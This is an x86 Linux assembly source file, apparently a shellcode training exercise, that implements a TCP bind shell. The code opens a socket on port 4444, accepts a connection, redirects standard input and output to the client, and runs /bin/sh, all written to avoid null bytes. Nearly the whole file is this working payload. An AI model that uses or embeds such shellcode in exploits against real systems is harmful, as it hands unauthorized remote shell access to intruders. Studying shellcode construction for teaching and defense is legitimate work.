; file: shell_bind_tcp.nasm
; Author: mariuszha
 
 
 
global _start
 
section .text
 
_start:
 
 	; clear registers
	xor eax, eax
	xor ebx, ebx
	xor edx, edx
	xor edi, edi

	mov al, 102 ; __NR_socketcall 102
	mov bl, 1 ; SYS_SOCKET

	; int socket(int domain, int type, int protocol)
	; int socket(AF_INET=2, SOCK_STREAM=1, protocol=0)
	; we push above on the stack with little endian
	push edx
	push ebx
	push 0x2
	mov ecx, esp ; ecx points to args (second argument of socketcall: int socketcall(int call, unsigned long *args))
	int 0x80 ; trigger syscall
	mov edi, eax ; save the socketfd


	; SYS_BIND
	; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
	; const struct sockaddr *addr: AF_INET=2, sin_port=4444, INADDR_ANY=0
	; struct sockaddr
	xor eax, eax
	mov al, 102 ; __NR_socketcall 102
	inc ebx ; SYS_BIND 2
	push edx  ; INADDR_ANY
	push word 0x5c11 ; port 4444
	push bx ; AF_INET
	mov ecx, esp
	
	push 0x10 ; socklen
	push ecx ; addr
	push edi ; socketfd
	mov ecx, esp ; points to args
	int 0x80 ; trigger syscall


	; SYS_LISTEN
	; int listen(int sockfd, int backlog)
	xor eax, eax
	mov al, 102 ; __NR_socketcall 102
	xor ebx, ebx
	mov bl, 4 ; SYS_LISTEN

	push edx ; backlog
	push edi ; sockfd
	mov ecx, esp
	int 0x80


	; SYS_ACCEPT
	; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
	; In our case when addr is NULL nothing is filled in, so addrlen is not used
	; int accept(int sockfd, NULL, NULL)
	xor eax, eax
	mov al, 102
	inc bl ; SYS_ACCEPT 5

	push edx ; NULL
	push edx ; NULL
	push edi ; socketfd
	mov ecx, esp
	int 0x80


	; int dup2(int oldfd, int newfd)
	; ebx = oldfd
	; ecx = stdin=0, stdout=1, stderr=2

	xor ecx, ecx
	mov cl, 2 ; loop counter
	mov ebx, eax ; save client socket
	xor eax, eax

dup2_loop:
	mov al, 0x3F
	int 0x80
	dec ecx
	jns dup2_loop


	; execve /bin/sh
	xor eax, eax
	push eax

	push 0x68732f2f ; hs//
	push 0x6e69622f ; nib/

	mov ebx, esp ; pointer to /bin//sh

	push eax
	mov edx, esp ; NULL terminator

	push ebx
	mov ecx, esp ; /bin//sh, 0

	mov al, 0xb ; __NR_execve 11
	int 0x80 ; trigger syscall
